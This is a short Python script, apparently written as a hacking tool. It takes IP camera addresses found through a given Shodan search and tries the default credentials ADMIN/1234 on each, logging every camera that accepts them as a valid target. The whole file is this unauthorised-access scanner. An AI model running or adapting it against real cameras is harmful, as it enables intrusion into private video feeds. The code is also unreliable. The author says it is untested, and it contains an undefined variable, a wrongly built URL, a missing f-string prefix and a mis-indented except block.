#-*- coding: utf-8 -*-
#authentication checker
#this code wasnt tested so theres probably a few bugs that might need fixing.

#checks whether default password is set for IPcam
#SHODAN SEARCH QUERY realm="WEB Remote Viewer"
import requests
from requests.auth import HTTPBasicAuth
def main():
    f = open("ipcam.txt", "r")
    file = f.readlines()
    for host in file:
        try:
            clean = host.replace('\n', '')
            ip_port = clean.split(':')
            ip, port = (ip_port[0], ip_port[1]) if len(ip_port) > 1 else (ip_port[0], 80)
            url = (f"http://{host}:{port}/")
            req = requests.get(url, auth=('ADMIN', '1234'))
            if req.status_code == 200:
                print("[+] VALID CREDENTIALS FOR: {x}")
                w = open("valid.txt", "a")
                w.write(x+"\n")
                w.close()
            else:
                print(f"[!] INVALID FOR: {x}")
       except:
           print("Error exception")
main()
